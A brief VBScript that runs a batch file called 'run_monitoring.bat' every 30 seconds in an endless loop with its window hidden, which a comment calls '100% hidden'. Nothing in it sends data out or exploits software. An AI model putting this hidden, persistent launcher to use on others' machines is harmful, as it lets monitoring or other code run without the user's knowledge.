Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
launcherPath = scriptDir & "\run_monitoring.bat"

' Run launcher continuously every 30 seconds with 0 window style (100% hidden)
Do
    WshShell.Run "cmd /c """ & launcherPath & """", 0, True
    WScript.Sleep 30000
Loop
